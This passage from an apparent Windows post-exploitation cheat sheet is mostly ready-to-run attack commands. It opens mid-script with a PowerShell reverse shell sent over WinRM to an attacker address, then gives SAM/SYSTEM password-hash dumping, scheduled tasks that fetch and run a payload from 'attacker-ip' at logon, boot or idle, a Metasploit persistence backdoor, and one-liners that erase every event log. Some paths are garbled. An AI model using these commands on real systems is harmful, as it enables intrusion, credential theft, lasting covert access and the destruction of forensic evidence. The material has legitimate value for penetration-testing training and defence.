  output = shell.run("$pass = convertto-securestring -AsPlainText -Force -String 'pass'; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist 'test.local\\username',$pass; Invoke-Command -ComputerName machine.test.local -Credential $cred -Port 5985 -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient('your-ip',port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); }") do |stdout, stderr|
    STDOUT.print stdout
    STDERR.print stderr
  end
  puts "The script exited with exit code #{output.exitcode}"
end
```

#### Extracting passwords from SAM and SYSTEM

\[1] With impacket tools

```
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

\[2] With `sampdump2`

```
samdump2 ./SYSTEM ./SAM
```

### Windows Persistence

Persistence is a method to maintain your access in case the target machine reboots/shuts down or even if you need to log out and disconnect from the shell. Many of what we discussed above in the post exploitation section can be used to achieve persistence. For example, when you extract password hashes of the system users or create new users, you can use them log in later thus you have created/established persistent access.

#### Persistence Methods

* Extracting hashes and cracking them to obtain the plain text password which can be used to login later. \[Discussed in Post Exploitation Section]
* Creating new accounts and adding them to a privileged group such as the administrators group. \[Discussed in Post Exploitation Section]
* Transferring backdoors to the machine \[coming soon]
* Persistence with Metasploit
* Running scripts/executables as a scheduled task and or adding them to the startup/autorun. \[Discussed below]
* Installing a fake service or inserting malicious code into an existing service in memory via a tool like Meterpreter can allow ongoing access to a system. Installing a daemon or service will provide longer access than code injected into memory, which won’t survive reboots, butinjected code is typically harder to detect.

**Persistence Using Scheduled Tasks- LOCAL** The below scheduled tasks will use PowerShell to retrieve/download and execute a payload hosted on the attacker machine **When the user logs in**. The payload could a direct reverse shell written in any language or it can be a malicious backdoor. #x86-bit-machine

```
SCHTASKS /CREATE /TN persistence /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient) .downloadstring("http://attacker-ip/ payload"))'" /SC onlogon /RU System
```

\#64-bit-machine

```
SCHTASKS /CREATE /TN persistence /TR
"C:\Windows\sjswow64\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient) .downloadstring("http://attacker-ip/ payload"))'" /SC onlogon /RU System
```

The below scheduled tasks will use PowerShell to retrieve/download and execute a payload hosted on the attacker machine **When the system starts/boots**. The payload could a direct reverse shell written in any language or it can be a malicious backdoor. #x86-bit-machine

```
SCHTASKS /CREATE /TN persistence /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient) .downloadstring("http://attacker-ip/ payload"))'" /SC onstart /RU System
```

\#64-bit-machine

```
SCHTASKS /CREATE /TN persistence /TR
"C:\Windows\sjswow64\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient) .downloadstring("http://attacker-ip/ payload"))'" /SC onstart /RU System
```

The below scheduled tasks will use PowerShell to retrieve/download and execute a payload hosted on the attacker machine **If the user is idle for more than 30 minutes**. The payload could a direct reverse shell written in any language or it can be a malicious backdoor. #x86-bit-machine

```
SCHTASKS /CREATE /TN persistence /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient) .downloadstring("http://attacker-ip/ payload"))'" /SC onidle /i 30
```

\#64-bit-machine

```
SCHTASKS /CREATE /TN persistence /TR
"C:\Windows\sjswow64\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient) .downloadstring("http://attacker-ip/ payload"))'" /SC onidle /i 30
```

**Persistence Using Scheduled Tasks- REMOTE**

```
SCHTASKS /Create /S <target> /RU <username> /RP
<password> /TN "<task name>" /TR "<command>"/SC
<frequency> /ST <time>
```

**Persistence with Metasploit** If you managed to compromise a machine and wants to logout and then login later, you can use Metasploit persistence module and plant a persistence backdoor. This method requires a Meterpreter session and an executable/backdoor that will connect back to your machine. Follow below steps

```
msf > use post/windows/manage/persistence
msf· > set LHOST <attackers ip>
msf > set LPORT <attackers port>
msf >set PAYLOAD_TYPE <tcp or http or https>
msf > set REXENAME backdoor.exe
msf >SESSION 1
msf> set STARTUP SERVICE
```

### Clearing Tracks

**Clearing Event Logs** \[1] cmd

```
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
```

\[2] powershell

```
wevtutil el | Foreach-Object {wevtutil cl "$_"}
```
